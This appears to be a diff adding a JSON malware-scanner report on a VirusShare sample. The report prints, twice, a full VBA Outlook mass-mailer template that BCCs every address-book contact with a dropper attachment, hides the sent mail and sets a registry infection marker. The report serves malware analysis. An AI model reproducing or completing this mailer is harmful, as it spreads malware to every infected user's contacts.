@@ -1,0 +1,77 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "RegRead": "May read registry keys",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "On Error Resume Next\nIf Day(Now) > 14 Then\nSet A = CreateObject(\"WScript.Shell\")\nB = A.RegRead(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\Currentversion\\Asmodeus\")\nIf B <> \"Ikx\" Then\nSet C = CreateObject(\"Outlook.Application\")\nSet D = C.GetNameSpace(\"MAPI\")\nFor Each E In D.AddressLists\nIf E.AddressEntries.Count > 0 Then\nSet F = C.CreateItem(0)\nFor G = 1 To E.AddressEntries.Count\nSet H = E.AddressEntries(G)\nIf G = 1 Then\nF.BCC = H.Address\nElse\nF.BCC = F.BCC & \"; \" & H.Address\nEnd If\nNext\nRandomize\nI = Int(3 * Rnd + 1)\nIf I = 1 Then\nF.Subject = \"Replace, subject 1\"\nF.Body = \"Replace, e-mail body 1\"\nElseIf I = 2 Then\nF.Subject = \"Replace, subject 2\"\nF.Body = \"Replace, e-mail body 2\"\nElse\nF.Subject = \"Replace, subject 3\"\nF.Body = \"Replace, e-mail body 3\"\nEnd If\nSet J = CreateObject(\"Scripting.FileSystemObject\")\nF.Attachments.Add J.BuildPath(J.GetSpecialFolder(1),\"Replace, name of the dropper\")\nF.DeleteAfterSubmit = True\nF.Send\nEnd If\nNext\nA.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Asmodeus\",\"Ikx\"\nEnd If\nEnd If"
+    },
+    "filename": "VirusShare_04df48f00e82e2b4c63ebd8f88ab1dbd",
+    "filesize": 1056,
+    "filetype": "ASCII text",
+    "hashes": {
+        "md5": "04df48f00e82e2b4c63ebd8f88ab1dbd",
+        "sha1": "ca9cd1ecc477d4f0f612ec821a59313041d60da6",
+        "sha256": "a61614436a787cae31cf8699d707161166d308df86cf04c43f472cc535cbd5cd"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On Error Resume Next",
+            "If Day(Now) > 14 Then",
+            "Set A = CreateObject(\"WScript.Shell\")",
+            "B = A.RegRead(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\Currentversion\\Asmodeus\")",
+            "If B <> \"Ikx\" Then",
+            "Set C = CreateObject(\"Outlook.Application\")",
+            "Set D = C.GetNameSpace(\"MAPI\")",
+            "For Each E In D.AddressLists",
+            "If E.AddressEntries.Count > 0 Then",
+            "Set F = C.CreateItem(0)",
+            "For G = 1 To E.AddressEntries.Count",
+            "Set H = E.AddressEntries(G)",
+            "If G = 1 Then",
+            "F.BCC = H.Address",
+            "Else",
+            "F.BCC = F.BCC & \"; \" & H.Address",
+            "End If",
+            "Next",
+            "Randomize",
+            "I = Int(3 * Rnd + 1)",
+            "If I = 1 Then",
+            "F.Subject = \"Replace, subject 1\"",
+            "F.Body = \"Replace, e-mail body 1\"",
+            "ElseIf I = 2 Then",
+            "F.Subject = \"Replace, subject 2\"",
+            "F.Body = \"Replace, e-mail body 2\"",
+            "Else",
+            "F.Subject = \"Replace, subject 3\"",
+            "F.Body = \"Replace, e-mail body 3\"",
+            "End If",
+            "Set J = CreateObject(\"Scripting.FileSystemObject\")",
+            "F.Attachments.Add J.BuildPath(J.GetSpecialFolder(1),\"Replace, name of the dropper\")",
+            "F.DeleteAfterSubmit = True",
+            "F.Send",
+            "End If",
+            "Next",
+            "A.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Asmodeus\",\"Ikx\"",
+            "End If",
+            "End If"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.269219",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
